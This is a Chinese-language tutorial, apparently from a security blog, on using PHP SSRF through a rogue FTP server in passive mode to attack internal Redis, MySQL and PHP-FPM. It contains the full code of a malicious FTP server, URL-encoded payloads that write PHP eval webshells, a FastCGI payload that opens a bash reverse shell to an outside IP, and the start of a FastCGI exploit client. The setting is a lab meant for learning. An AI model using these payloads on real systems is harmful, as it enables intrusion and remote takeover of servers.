<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>file_get_contents是从ftp下载文件</li>
<li>file_get_contents是上传文件到ftp服务器</li>
</ul>
<p>那么我们的思路就是把恶意语句存到我们vps的一个服务器上，然后让client下载，在上传的时候我们恶意的ftp将其重定向到client的内网中，这样就完成了攻击。<br>我们的恶意ftp服务器代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evil_ftp.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>然后载荷payload为<code>filename=ftp://aaa@114.116.119.253:8555/123&amp;data=test</code><br>这样我们监听一下9000端口后就可以收到信息了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683909494151-4f41faa4-907e-43e5-821a-1a6d9b374679.png#averageHue=%231a1715&clientId=u52e5d158-cb25-4&from=paste&height=115&id=ud02679c2&originHeight=144&originWidth=641&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11733&status=done&style=none&taskId=u98e75b64-dcf7-440a-b606-8593c6ad434&title=&width=512.8" alt="image.png"><br>还挺不错的</p>
<h1 id="五、FTP被动模式攻击内网服务"><a href="#五、FTP被动模式攻击内网服务" class="headerlink" title="五、FTP被动模式攻击内网服务"></a>五、FTP被动模式攻击内网服务</h1><h2 id="（1）Redis"><a href="#（1）Redis" class="headerlink" title="（1）Redis"></a>（1）Redis</h2><p>假如想打redis的话前提是做一下环境搭建，否则另说。我们需要的东西是</p>
<ul>
<li>php-server（这里是php-8.2）</li>
<li>redis</li>
<li>gopherus&#x2F;redis-crlf-payload</li>
</ul>
<p>主要是搭redis可能会遇到点问题（一般都是这里出问题）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683910296270-af631b0e-da8e-46ba-bf9d-e1fcf28136eb.png#averageHue=%233e3931&clientId=u52e5d158-cb25-4&from=paste&height=708&id=u1f51bccc&originHeight=885&originWidth=1670&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2106003&status=done&style=none&taskId=ua5833178-c9c8-4f39-804f-9047bc0ffb9&title=&width=1336" alt="image.png"><br>test-checker检测正常，环境无误<br>那么进入实操环节，首先gopherus生成一下redis的payload，或者使用自己的py脚本生成都是可以的。<br>首先生成payload<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683911856854-920af657-3572-4583-8292-c104f829b2ff.png#averageHue=%235b553e&clientId=uee8c563f-eb16-4&from=paste&height=341&id=u27fab16b&originHeight=426&originWidth=827&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=528675&status=done&style=none&taskId=u4fbfab67-a406-4875-8e1e-f686f2bc70a&title=&width=661.6" alt="image.png"><br>然后打入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683911862058-13e8594c-8a00-4933-8946-d5a25665defd.png#averageHue=%23b2b2b2&clientId=uee8c563f-eb16-4&from=paste&height=832&id=ue0171789&originHeight=1040&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=119193&status=done&style=none&taskId=uc62858f2-dae5-4e80-abe6-c7d4514a185&title=&width=1522.4" alt="image.png"><br><code>data=%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A&amp;filename=ftp://aaa@127.0.0.1:8555/123</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1683911845810-7166cc06-6644-4ac8-8601-6ab9b1a4a46e.png#averageHue=%23434034&clientId=uee8c563f-eb16-4&from=paste&height=708&id=u3f98841d&originHeight=885&originWidth=1670&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2118519&status=done&style=none&taskId=u405035e1-f66e-4740-94f2-f51744111fc&title=&width=1336" alt="image.png"><br>可以看到成功写入shell。easy<br>这里需要注意一个问题就是redis的版本必须在7一下，在7以上的版本中开启了保护机制，即无法set dir，dir选项被保护了，我们无法getshell。所以现在redis也基本打不着了除了一些老版本，在实战中很难遇见</p>
<h2 id="（2）Mysql"><a href="#（2）Mysql" class="headerlink" title="（2）Mysql"></a>（2）Mysql</h2><p>打mysql的话流程和redis是一样的</p>
<ul>
<li>php-server（这里是php-8.2）</li>
<li>mysql</li>
<li>gopherus</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684074579471-34d7c2d3-343d-425c-aa46-bd661ade07e0.png#averageHue=%2347433c&clientId=u2b78e55b-484f-4&from=paste&height=511&id=uc394eb52&originHeight=639&originWidth=993&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1008421&status=done&style=none&taskId=u8eec4e62-427d-46a7-9cf0-0fac85575ca&title=&width=794.4" alt="image.png"><br>准备数据库如上，需一个无密码的root用户，这样才可以进行ssrf，我们也是一样的流程。<br>首先gopherus生成一个gopher协议的payload，截取后面的部分<br><code>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4d%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%62%6f%6f%67%69%70%6f%70%2e%70%68%70%27%3b%01%00%00%00%01</code><br>截取下划线后半的部分，然后传参如上即可，本地由于版本太高没打通，思路是这样。现在找老版本的mysql太抽象了</p>
<h2 id="（3）PHP-FPM"><a href="#（3）PHP-FPM" class="headerlink" title="（3）PHP-FPM"></a>（3）PHP-FPM</h2><p>选择镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -P 80  bitnami/php-fpm</span><br></pre></td></tr></table></figure>
<p>运行之后环境就起来了。个屁。<br>废了九牛二虎之力搭好了环境。环境搭建如下，首先如上起一个容器，然后我们在容器中依次使用以下指令<br><code>apt-get update&amp;&amp;apt-get install nginx</code><br>然后在&#x2F;etc&#x2F;nginx&#x2F;nginx.conf中修改一下配置文件，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http</span><br><span class="line">&#123;</span><br><span class="line">server &#123;</span><br><span class="line">  listen 0.0.0.0:80;</span><br><span class="line">  server_name localhost;</span><br><span class="line"></span><br><span class="line">  root /app;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    try_files $uri $uri/index.php;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">    fastcgi_index index.php;</span><br><span class="line">    include fastcgi.conf;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后你可以安装vim、netstat指令方便调试，分别用<code>apt-get install vim&amp;&amp;apt-get install net-tools</code>进行安装即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684078530532-805979fc-24d4-4205-bc80-c571c4f9d25b.png#averageHue=%23949494&clientId=u2b78e55b-484f-4&from=paste&height=630&id=u647f18e0&originHeight=787&originWidth=1350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=125856&status=done&style=none&taskId=uaf676d1b-66d3-4c3f-bf6e-35968436ce2&title=&width=1080" alt="image.png"><br>很玄学为什么shell直接断了？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684078535290-15e071a8-a9bf-4d85-8b87-4cc498927c78.png#averageHue=%23161413&clientId=u2b78e55b-484f-4&from=paste&height=328&id=u740702a5&originHeight=410&originWidth=806&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44843&status=done&style=none&taskId=u1e1e937e-23dd-4d97-985c-92d82a071b6&title=&width=644.8" alt="image.png"><br>排坑ing……………………<br>我是傻逼，反弹shell断了的原因是我漏了<code>&lt;&amp;1</code>，断了一个尾巴还弹牛魔呢。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684079254424-81b3b01f-e5f5-4de4-a723-928b3b3404a8.png#averageHue=%238d8d8d&clientId=u2b78e55b-484f-4&from=paste&height=678&id=u824b2599&originHeight=848&originWidth=1330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134243&status=done&style=none&taskId=u20bc5186-2be9-4222-8434-424ca0d9ea7&title=&width=1064" alt="image.png"><br><code>filename=ftp://aaa@114.116.119.253:8555/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%FC%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%0ESCRIPT_FILENAME/app/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/114.116.119.253/2333%20%3C%26%201%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684079268479-e3aae77b-2884-4aaf-b387-7f1a41c6b368.png#averageHue=%23232221&clientId=u2b78e55b-484f-4&from=paste&height=430&id=ucfadd32a&originHeight=537&originWidth=720&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35570&status=done&style=none&taskId=u224f4e27-56bb-49ac-8028-d1651c4205e&title=&width=576" alt="image.png"><br>直接getshell<br>到这里有关FTP攻击内网服务的方式都实现完了，接下来我们着重讲一下PHP-FPM有关的攻击，这玩意儿攻击点很多。</p>
<h1 id="六、PHP-FPM攻击"><a href="#六、PHP-FPM攻击" class="headerlink" title="六、PHP-FPM攻击"></a>六、PHP-FPM攻击</h1><h2 id="（1）PHP-FPM-未授权访问导致的RCE"><a href="#（1）PHP-FPM-未授权访问导致的RCE" class="headerlink" title="（1）PHP-FPM 未授权访问导致的RCE"></a>（1）PHP-FPM 未授权访问导致的RCE</h2><p>这东西其实在CTF中见到的并不算多，因为直接攻击远程PHP-FPM需要9000端口暴露在外，但是实际是不会这样的。这里简单说一下思路<br>假如9000端口暴露在外，我们可以和PHP-FPM进行通信，那我们就可以构造FASTCGI的语言去和FPM交互，也就可以进行一些恶意操作<br>还记得文件上传中的<code>.user.ini</code>里面的两个选项吗</p>
<ul>
<li>auto_prepend_file：是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；</li>
<li>auto_prepend_file：是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；</li>
</ul>
<p>然后上述讲协议的时候我们讲到了FASTCGI会解析为键值对。<br>而PHP-FPM环境变量里有2个选项可以用来设置PHP的配置(disable除外）</p>
<ul>
<li>PHP_VALUE</li>
<li>PHP_ADMIN_VALUE</li>
</ul>
<p>最后可以构造恶意数据包如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们让自动包含东西为input协议并且开启url_include,这样就可以getshell了<br>这里给出P神的脚本<br><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<h2 id="（2）SSRF-攻击-PHP-FPM"><a href="#（2）SSRF-攻击-PHP-FPM" class="headerlink" title="（2）SSRF 攻击 PHP-FPM"></a>（2）SSRF 攻击 PHP-FPM</h2><p>SSRF的话首先包括上述说的FTP打PHP-FPM其实本质都是一样的，利用gopher或者ftp去和fpm通信去打，依然可以用p神脚本，改改就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        